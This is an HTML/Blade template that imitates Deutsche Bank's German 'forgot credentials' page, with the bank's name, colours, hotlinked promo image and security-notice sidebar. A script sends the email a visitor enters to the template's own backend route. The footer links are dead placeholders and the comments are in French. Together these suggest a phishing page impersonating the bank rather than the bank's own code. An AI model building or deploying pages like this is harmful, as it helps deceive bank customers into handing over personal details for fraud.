<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta name="csrf-token" content="{{ csrf_token() }}">
<title>Deutsche Bank – Zugangsdaten vergessen</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}

:root{
  --blue:#0066b2;
  --blue-dk:#00519e;
  --navy:#1a2c6b;
  --red:#cc0000;
  --grey:#e8e8e8;
  --grey-t:#767676;
  --text:#202020;
  --white:#fff;
  --link:#0066b2;
  --green:#1a8a3a;
  --sidebar-w:375px;
}

html,body{
  min-height:100%;
  font-family:"DeutscheBank UI",Helvetica,sans-serif;
  font-size:25px;
  color:var(--text);
}
body{
  background-color:#3a8fd4;
  background-image:url("{{ asset('dbbg.jpg') }}");
  background-size:cover;
  background-position:center top;
  background-attachment:fixed;
  background-repeat:no-repeat;
}

.page{ min-height:100vh; display:flex; flex-direction:column; }
.layout{ flex:1; display:flex; align-items:flex-start; }

.left-col{
  flex:1; min-height:100vh; display:flex;
  align-items:center; padding-left:18%;
}

/* ── CARD ── */
.card{
  background:var(--white);
  width:560px;
  padding:46px 54px 50px;
  animation:fadeUp .38s ease both;
}

.logo-row{ display:flex; align-items:center; gap:8px; margin-bottom:28px; }
.logo-text{ font-size:16.5px; font-weight:400; color:var(--text); }
.logo-sq{
  width:24px; height:24px; flex-shrink:0;
  border:2px solid var(--blue); background:var(--white);
  display:flex; align-items:center; justify-content:center;
}

.card-title{ font-size:28px; font-weight:700; color:var(--text); margin-bottom:9px; line-height:1.1; }
.card-sub  { font-size:14.5px; color:var(--text); margin-bottom:28px; line-height:1.5; }

/* ── Champ ── */
.field{ display:flex; flex-direction:column; margin-bottom:20px; }
.lbl{ font-size:12.5px; margin-bottom:3px; color:var(--text); }
.lbl.red{ color:var(--red); }

.inp{
  height:40px; border:1px solid #aaa;
  padding:0 9px; font-size:14.5px; color:var(--text);
  background:var(--white); outline:none; border-radius:0;
  -webkit-appearance:none; width:100%; display:block;
  transition:border-color .13s, box-shadow .13s;
}
.inp.err{ border:1.5px solid var(--red); }
.inp:focus{ border-color:var(--blue); box-shadow:0 0 0 2px rgba(0,102,178,.17); }
.inp.err:focus{ border-color:var(--red); box-shadow:0 0 0 2px rgba(204,0,0,.13); }

/* ── Alerte erreur ── */
.alert-error{
  display:none;
  background:#fff0f0; border-left:3px solid var(--red);
  color:var(--red); font-size:13px;
  padding:10px 12px; margin-bottom:16px; line-height:1.4;
}
.alert-error.visible{ display:block; animation:fadeUp .25s ease; }

/* ── Écran de succès (étape 2) ── */
.success-screen{
  display:none;
  flex-direction:column;
  align-items:center;
  text-align:center;
  padding:16px 0 8px;
  animation:fadeUp .35s ease both;
}
.success-screen.visible{ display:flex; }

.success-icon{
  width:64px; height:64px;
  background:#f0fff4;
  border-radius:50%;
  border:2px solid #b0e0c0;
  display:flex; align-items:center; justify-content:center;
  margin-bottom:20px;
}
.success-title{
  font-size:22px; font-weight:700;
  color:var(--green); margin-bottom:12px;
}
.success-msg{
  font-size:14px; color:var(--text);
  line-height:1.6; margin-bottom:8px;
}
.success-email{
  font-weight:700; color:var(--blue);
  font-size:14.5px; word-break:break-all;
}
.success-note{
  font-size:12.5px; color:var(--grey-t);
  margin-top:16px; line-height:1.5;
}
.success-note a{
  color:var(--link); text-decoration:underline; cursor:pointer;
  background:none; border:none; font-family:inherit; font-size:inherit; padding:0;
}

/* ── Bottom ── */
.card-btm{
  display:flex; align-items:center;
  justify-content:space-between; margin-top:4px;
}
.back-link{
  color:var(--link); font-size:13.5px; text-decoration:underline;
  background:none; border:none; cursor:pointer; padding:0; font-family:inherit;
}
.back-link:hover{ color:var(--blue-dk); }

.btn-action{
  background:var(--blue); color:#fff; border:none;
  height:42px; padding:0 28px; font-size:15px; font-weight:400;
  font-family:inherit; cursor:pointer; border-radius:0; min-width:130px;
  transition:background .13s; position:relative; overflow:hidden;
}
.btn-action:hover{ background:var(--blue-dk); }
.btn-action:active{ background:#003f80; }
.btn-action:disabled{ opacity:.65; cursor:default; }

.btn-action .spinner{
  display:none; width:16px; height:16px;
  border:2px solid rgba(255,255,255,.35); border-top-color:#fff;
  border-radius:50%; animation:spin .7s linear infinite;
  position:absolute; top:50%; left:50%;
  transform:translate(-50%,-50%);
}
.btn-action.loading .btn-label{ opacity:0; }
.btn-action.loading .spinner{ display:block; }

/* ── Séparateur ── */
.divider{
  border:none; border-top:1px solid #e8e8e8;
  margin:24px 0 20px;
}

/* ── SIDEBAR ── */
.sidebar{
  width:var(--sidebar-w); flex-shrink:0;
  background:var(--white); display:flex;
  flex-direction:column; min-height:100vh;
  margin-right:250px;
}
.promo-img{
  width:100%; height:182px; padding:5%;
  background-size:auto; position:relative; overflow:hidden; flex-shrink:0;
}
.ph-big{
  position:absolute; right:80px; top:50%; transform:translateY(-50%);
  width:66px; height:112px;
  background:linear-gradient(170deg,#3a3a58,#22223a);
  border-radius:10px; border:1.5px solid rgba(255,255,255,.2);
  box-shadow:-7px 5px 20px rgba(0,0,0,.5);
}
.ph-big-scr{
  position:absolute; inset:5px;
  background:linear-gradient(145deg,#0e5caa,#07305c);
  border-radius:6px; overflow:hidden;
  display:flex; align-items:flex-end; justify-content:flex-end; padding:5px;
}
.ph-card{ width:30px; height:20px; background:linear-gradient(135deg,#e8b000,#b88800); border-radius:3px; border:1px solid rgba(255,255,255,.25); }
.ph-sm{
  position:absolute; right:30px; bottom:14px;
  width:48px; height:78px;
  background:linear-gradient(170deg,#484860,#2e2e48);
  border-radius:8px; border:1.5px solid rgba(255,255,255,.15);
  box-shadow:4px 4px 16px rgba(0,0,0,.4);
}
.ph-sm-scr{ position:absolute; inset:4px; background:#fff; border-radius:4px; overflow:hidden; }
.ph-sm-scr::after{ content:''; display:block; width:100%; height:50%; background:linear-gradient(to bottom,#ddeaf8,#c8d8ec); }
.promo-badge{
  position:absolute; top:18px; right:74px;
  width:40px; height:40px; background:#14142a; border-radius:50%;
  border:2px solid rgba(255,255,255,.22);
  display:flex; flex-direction:column; align-items:center; justify-content:center;
  color:#fff; font-size:7.5px; font-weight:700; text-align:center; line-height:1.3;
}
.promo-body{ padding:5%; border-bottom:1px solid #e0e0e0; }
.promo-title{ font-size:20px; font-weight:700; color:var(--text); margin-bottom:8px; }
.promo-desc{ font-size:16px; color:var(--text); line-height:1.5; margin-bottom:8px; }
.promo-mehr{ color:var(--link); font-size:15px; text-decoration:underline; cursor:pointer; background:none; border:none; padding:0; font-family:inherit; }
.info-blk{ padding:26px 18px 13px; border-bottom:1px solid #e0e0e0; }
.info-hd{ display:flex; align-items:center; gap:9px; margin-bottom:7px; }
.info-ic{ flex-shrink:0; display:flex; align-items:center; }
.info-ttl{ font-size:20px; font-weight:700; color:var(--text); }
.info-txt{ font-size:15px; color:var(--text); line-height:1.5; margin-bottom:7px; }
.info-lnk{ display:block; color:var(--link); font-size:14px; text-decoration:underline; cursor:pointer; background:none; border:none; padding:0; font-family:inherit; text-align:left; margin-bottom:3px; line-height:1.5; }
.info-lnk:last-child{ margin-bottom:0; }
.ft{ background:var(--navy); padding:28px 28px 16px; margin-top:auto; }
.ft-links{ display:flex; flex-wrap:wrap; gap:4px 12px; margin-bottom:6px; }
.ft-a{ color:rgba(255,255,255,.88); font-size:16.5px; text-decoration:none; cursor:pointer; }
.ft-a:hover{ text-decoration:underline; }
.ft-copy{ font-size:15.5px; color:rgba(255,255,255,.6); margin-top:4px; }

/* ── Animations ── */
@keyframes fadeUp{ from{opacity:0;transform:translateY(16px)} to{opacity:1;transform:translateY(0)} }
@keyframes shake{ 0%,100%{transform:translateX(0)} 20%{transform:translateX(-5px)} 40%{transform:translateX(5px)} 60%{transform:translateX(-3px)} 80%{transform:translateX(3px)} }
@keyframes spin{ to{transform:translate(-50%,-50%) rotate(360deg)} }
.shake{ animation:shake .33s ease; }

/* ── Mobile ── */
@media(max-width:767px){
  body{ background-image:none; background-color:var(--navy); }
  .layout{ flex-direction:column; }
  .left-col{ flex:none; min-height:0; padding:0; width:100%; display:block; }
  .card{ width:100%; padding:26px 18px 30px; border-radius:0; }
  .card-title{ font-size:24px; }
  .inp{ height:44px; }
  .card-btm{ flex-direction:column; align-items:stretch; gap:10px; }
  .btn-action{ width:100%; order:-1; height:44px; }
  .back-link{ text-align:left; }
  .sidebar{ width:100%; min-height:0; margin-right:0; }
}
@media(min-width:768px) and (max-width:1100px){
  :root{ --sidebar-w:280px; }
  .left-col{ padding-left:2%; }
  .card{ width:380px; padding:30px 32px 34px; }
  .sidebar{ margin-right:60px; }
}
</style>
</head>
<body>
<div class="page">
  <div class="layout">

    <!-- ====== CARD ====== -->
    <div class="left-col">
      <div class="card">

        {{-- Logo --}}
        <div class="logo-row">
          <span class="logo-text">Deutsche Bank</span>
          <div class="logo-sq">
            <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
              <line x1="1" y1="1" x2="13" y2="13" stroke="#0066b2" stroke-width="2.2" stroke-linecap="square"/>
            </svg>
          </div>
        </div>

        {{-- ── ÉTAPE 1 : Formulaire email ── --}}
        <div id="step1">
          <h1 class="card-title">Zugangsdaten vergessen?</h1>
          <p class="card-sub">
            Geben Sie Ihre registrierte E-Mail-Adresse ein. Wir senden Ihnen einen Link zum Zurücksetzen Ihres Passworts.
          </p>

          {{-- Alerte erreur --}}
          <div class="alert-error" id="alertError"></div>

          <div class="field">
            <label class="lbl red" for="email">E-Mail-Adresse</label>
            <input class="inp err" type="email" id="email"
                   autocomplete="email"
                   placeholder="beispiel@deutschebank.de"/>
          </div>

          <hr class="divider">

          <div class="card-btm">
            <a class="back-link" href="{{ route('login') }}">
              ← Zurück zur Anmeldung
            </a>
            <button class="btn-action" type="button" id="sendBtn">
              <span class="btn-label">Link senden</span>
              <span class="spinner"></span>
            </button>
          </div>
        </div>

        {{-- ── ÉTAPE 2 : Confirmation envoi ── --}}
        <div class="success-screen" id="step2">
          <div class="success-icon">
            <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
              <path d="M6 16l7 7L26 9" stroke="#1a8a3a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
            </svg>
          </div>
          <p class="success-title">E-Mail gesendet!</p>
          <p class="success-msg">
            Wir haben einen Link zum Zurücksetzen des Passworts an
          </p>
          <span class="success-email" id="confirmedEmail"></span>
          <p class="success-msg" style="margin-top:8px;">
            gesendet. Bitte überprüfen Sie Ihren Posteingang.
          </p>
          <p class="success-note">
            Keine E-Mail erhalten?
            <button type="button" id="resendBtn">Erneut senden</button>
            &nbsp;·&nbsp;
            <a href="{{ route('login') }}">Zur Anmeldung</a>
          </p>
        </div>

      </div>
    </div>

    <!-- ====== SIDEBAR ====== -->
    <aside class="sidebar">
      <div class="promo-img">
        <img style="width:100%;" src="https://www.deutsche-bank.de/dam/deutschebank/de/shared/trxm/vorteilswelt/Samsung_Wallet_ Promo_1200x750_DB_ohne_Logo_ohne_Energielabel.jpg" alt=""/>
        <div class="promo-badge">Spezial-<br>Deal</div>
      </div>
      <div class="promo-body">
        <h2 class="promo-title">Spezial-Angebot für das neue Galaxy S26</h2>
        <p class="promo-desc">Sichern Sie sich auf das neue Smartphone von Samsung Ihren Preisvorteil und freuen Sie sich auf das erste Privacy-Display in einem Smartphone (Ultra-Modell).</p>
        <button class="promo-mehr">Zur Vorteilswelt</button>
      </div>
      <div class="info-blk">
        <div class="info-hd">
          <div class="info-ic">
            <svg width="19" height="19" viewBox="0 0 19 19" fill="none">
              <path d="M9.5 2.5L17 16.5H2L9.5 2.5Z" stroke="#333" stroke-width="1.4" stroke-linejoin="round"/>
              <line x1="9.5" y1="8" x2="9.5" y2="12" stroke="#333" stroke-width="1.5" stroke-linecap="round"/>
              <circle cx="9.5" cy="14" r=".85" fill="#333"/>
            </svg>
          </div>
          <span class="info-ttl">Sicherheitshinweise</span>
        </div>
        <p class="info-txt">Schützen Sie sich und Ihr Online-Banking. Wir helfen Ihnen gern.</p>
        <button class="info-lnk">Link zu den aktuellen Sicherheitshinweisen</button>
        <button class="info-lnk">Link zu Sicherheit im Überblick</button>
      </div>
      <div class="info-blk">
        <div class="info-hd">
          <div class="info-ic">
            <svg width="21" height="18" viewBox="0 0 21 18" fill="none">
              <rect x="1" y="1" width="19" height="13" rx="1" stroke="#333" stroke-width="1.4"/>
              <rect x="3.5" y="3.5" width="14" height="8" stroke="#333" stroke-width="1"/>
              <line x1="6.5" y1="14" x2="14.5" y2="14" stroke="#333" stroke-width="1.4"/>
              <line x1="10.5" y1="14" x2="10.5" y2="17" stroke="#333" stroke-width="1.4"/>
              <line x1="6.5" y1="17" x2="14.5" y2="17" stroke="#333" stroke-width="1.4"/>
            </svg>
          </div>
          <span class="info-ttl">Online-Banking Zugang</span>
        </div>
        <p class="info-txt">Hier können Sie Ihren persönlichen Zugang zum Online-Banking beantragen.</p>
        <button class="info-lnk">Zugang zum Online-Banking beantragen</button>
      </div>
      <div class="info-blk">
        <div class="info-hd">
          <div class="info-ic">
            <svg width="17" height="21" viewBox="0 0 17 21" fill="none">
              <rect x="1.5" y="8.5" width="14" height="11" rx="1" stroke="#333" stroke-width="1.4"/>
              <path d="M5 8.5V5.5a3.5 3.5 0 017 0v3" stroke="#333" stroke-width="1.4"/>
              <circle cx="8.5" cy="13.5" r="1.5" fill="#333"/>
              <line x1="8.5" y1="15" x2="8.5" y2="17" stroke="#333" stroke-width="1.4" stroke-linecap="round"/>
            </svg>
          </div>
          <span class="info-ttl">Unsere Sicherheitsverfahren</span>
        </div>
        <p class="info-txt">Alles Wissenswerte rund um Ihren Login.</p>
        <button class="info-lnk">Link zu den Sicherheitsverfahren</button>
      </div>
      <footer class="ft">
        <div class="ft-links">
          <a class="ft-a" href="#" onclick="return false;">English Version</a>
          <a class="ft-a" href="#" onclick="return false;">Hilfe</a>
          <a class="ft-a" href="#" onclick="return false;">Demo-Konto</a>
          <a class="ft-a" href="#" onclick="return false;">Impressum</a>
          <a class="ft-a" href="#" onclick="return false;">Rechtliche Hinweise</a>
          <a class="ft-a" href="#" onclick="return false;">Datenschutz</a>
          <a class="ft-a" href="#" onclick="return false;">Cookie-Einstellungen</a>
        </div>
        <p class="ft-copy">© 2026 Deutsche Bank AG</p>
      </footer>
    </aside>

  </div>
</div>

<script>
(function () {

  var emailInput    = document.getElementById('email');
  var sendBtn       = document.getElementById('sendBtn');
  var btnLabel      = sendBtn.querySelector('.btn-label');
  var resendBtn     = document.getElementById('resendBtn');
  var alertError    = document.getElementById('alertError');
  var step1         = document.getElementById('step1');
  var step2         = document.getElementById('step2');
  var confirmedEmail = document.getElementById('confirmedEmail');
  var csrfToken     = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

  /* ── Helpers ── */
  function showError(msg) {
    alertError.textContent = msg;
    alertError.classList.add('visible', 'shake');
    alertError.addEventListener('animationend', function () {
      alertError.classList.remove('shake');
    }, { once: true });
  }

  function clearError() {
    alertError.classList.remove('visible');
    alertError.textContent = '';
  }

  function shakeField(el) {
    el.classList.add('err', 'shake');
    el.addEventListener('animationend', function () {
      el.classList.remove('shake');
    }, { once: true });
  }

  function setLoading(on) {
    sendBtn.disabled = on;
    sendBtn.classList.toggle('loading', on);
  }

  function isValidEmail(val) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
  }

  /* ── Envoi du lien ── */
  function sendResetLink(email) {
    setLoading(true);
    clearError();

    fetch('{{ route("password.forgot.send") }}', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept':       'application/json',
        'X-CSRF-TOKEN': csrfToken
      },
      body: JSON.stringify({ email: email })
    })
    .then(function (res) { return res.json(); })
    .then(function (data) {
      setLoading(false);

      if (data.success) {
        /* Afficher l'écran de confirmation */
        confirmedEmail.textContent = email;
        step1.style.display        = 'none';
        step2.classList.add('visible');
      } else {
        showError(data.message || 'Ein Fehler ist aufgetreten.');
        shakeField(emailInput);
      }
    })
    .catch(function () {
      setLoading(false);
      showError('Verbindungsfehler. Bitte versuchen Sie es erneut.');
    });
  }

  /* ── Bouton Envoyer ── */
  sendBtn.addEventListener('click', function () {
    var email = emailInput.value.trim();

    if (!email) {
      shakeField(emailInput);
      showError('Bitte geben Sie Ihre E-Mail-Adresse ein.');
      return;
    }
    if (!isValidEmail(email)) {
      shakeField(emailInput);
      showError('Bitte geben Sie eine gültige E-Mail-Adresse ein.');
      return;
    }

    sendResetLink(email);
  });

  /* ── Bouton Erneut senden ── */
  resendBtn.addEventListener('click', function () {
    var email = confirmedEmail.textContent;
    /* Revenir à l'étape 1 visuellement */
    step2.classList.remove('visible');
    step1.style.display = '';
    /* Puis renvoyer immédiatement */
    sendResetLink(email);
  });

  /* ── Enter dans le champ email ── */
  emailInput.addEventListener('keydown', function (e) {
    if (e.key === 'Enter') sendBtn.click();
  });
  emailInput.addEventListener('focus', clearError);

})();
</script>
</body>
</html>
